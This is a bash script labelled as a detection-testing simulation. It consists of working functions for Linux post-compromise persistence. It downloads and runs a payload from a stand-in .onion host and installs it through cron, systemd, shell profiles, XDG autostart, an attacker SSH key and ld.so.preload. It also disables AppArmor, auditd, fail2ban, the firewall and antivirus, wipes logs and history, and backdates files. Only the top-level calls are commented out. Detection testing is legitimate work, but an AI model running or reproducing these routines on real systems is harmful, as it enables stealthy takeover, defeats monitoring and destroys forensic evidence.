#!/bin/bash
# Linux Persistence Script - TEST SIMULATION ONLY
# DO NOT EXECUTE - For security detection testing

PAYLOAD_URL="http://malicious-server.onion/backdoor"
PAYLOAD_PATH="/tmp/.X11-unix/.update"
HIDDEN_DIR="/var/tmp/.cache"

echo "[!] LINUX PERSISTENCE SIMULATION - TEST FILE ONLY"

# Create hidden directories
mkdir -p "$HIDDEN_DIR" 2>/dev/null
mkdir -p "/dev/shm/.tmp" 2>/dev/null

# Download payload
download_payload() {
    curl -sL "$PAYLOAD_URL" -o "$PAYLOAD_PATH" 2>/dev/null || \
    wget -q "$PAYLOAD_URL" -O "$PAYLOAD_PATH" 2>/dev/null || \
    python3 -c "import urllib.request; urllib.request.urlretrieve('$PAYLOAD_URL', '$PAYLOAD_PATH')" 2>/dev/null
    
    chmod +x "$PAYLOAD_PATH" 2>/dev/null
}

# Persistence Method 1: Crontab
install_cron() {
    (crontab -l 2>/dev/null; echo "*/5 * * * * $PAYLOAD_PATH") | crontab -
    (crontab -l 2>/dev/null; echo "@reboot $PAYLOAD_PATH") | crontab -
}

# Persistence Method 2: Systemd user service
install_systemd_user() {
    mkdir -p ~/.config/systemd/user/
    cat > ~/.config/systemd/user/update.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=$PAYLOAD_PATH
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF
    systemctl --user daemon-reload 2>/dev/null
    systemctl --user enable update.service 2>/dev/null
    systemctl --user start update.service 2>/dev/null
}

# Persistence Method 3: Systemd system service (requires root)
install_systemd_system() {
    cat > /etc/systemd/system/system-update.service << EOF
[Unit]
Description=System Update Daemon
After=network.target

[Service]
Type=forking
ExecStart=$PAYLOAD_PATH
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload 2>/dev/null
    systemctl enable system-update.service 2>/dev/null
}

# Persistence Method 4: rc.local
install_rclocal() {
    echo "$PAYLOAD_PATH &" >> /etc/rc.local 2>/dev/null
    chmod +x /etc/rc.local 2>/dev/null
}

# Persistence Method 5: Profile scripts
install_profile() {
    echo "($PAYLOAD_PATH &>/dev/null &)" >> ~/.bashrc
    echo "($PAYLOAD_PATH &>/dev/null &)" >> ~/.bash_profile
    echo "($PAYLOAD_PATH &>/dev/null &)" >> ~/.profile
    echo "($PAYLOAD_PATH &>/dev/null &)" >> ~/.zshrc 2>/dev/null
}

# Persistence Method 6: XDG autostart
install_xdg() {
    mkdir -p ~/.config/autostart/
    cat > ~/.config/autostart/update.desktop << EOF
[Desktop Entry]
Type=Application
Name=System Update
Exec=$PAYLOAD_PATH
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF
}

# Persistence Method 7: SSH authorized_keys backdoor
install_ssh_backdoor() {
    mkdir -p ~/.ssh
    chmod 700 ~/.ssh
    # Would add attacker's public key
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@evil" >> ~/.ssh/authorized_keys
    chmod 600 ~/.ssh/authorized_keys
}

# Persistence Method 8: LD_PRELOAD hijacking
install_ld_preload() {
    echo "$HIDDEN_DIR/libupdate.so" >> /etc/ld.so.preload 2>/dev/null
}

# Persistence Method 9: PAM backdoor
install_pam_backdoor() {
    # Would modify /etc/pam.d/common-auth to accept magic password
    # This is extremely dangerous and for simulation only
    :
}

# Persistence Method 10: Kernel module (rootkit)
install_kernel_module() {
    # Would load malicious kernel module
    # insmod /path/to/rootkit.ko
    :
}

# Disable security tools
disable_security() {
    # Stop and disable common security services
    systemctl stop apparmor 2>/dev/null
    systemctl disable apparmor 2>/dev/null
    systemctl stop auditd 2>/dev/null
    systemctl disable auditd 2>/dev/null
    systemctl stop fail2ban 2>/dev/null
    
    # Disable firewall
    ufw disable 2>/dev/null
    iptables -F 2>/dev/null
    
    # Kill security processes
    pkill -9 clamd 2>/dev/null
    pkill -9 freshclam 2>/dev/null
    pkill -9 rkhunter 2>/dev/null
}

# Clean traces
clean_traces() {
    # Clear bash history
    history -c
    cat /dev/null > ~/.bash_history
    unset HISTFILE
    
    # Clear logs
    cat /dev/null > /var/log/auth.log 2>/dev/null
    cat /dev/null > /var/log/syslog 2>/dev/null
    cat /dev/null > /var/log/messages 2>/dev/null
    cat /dev/null > /var/log/secure 2>/dev/null
    
    # Remove timestamps
    touch -t 202001010000 "$PAYLOAD_PATH" 2>/dev/null
}

# Main execution (commented out for safety)
# download_payload
# install_cron
# install_systemd_user
# install_profile
# install_xdg
# disable_security
# clean_traces

echo "[*] Persistence methods demonstrated (not executed)"
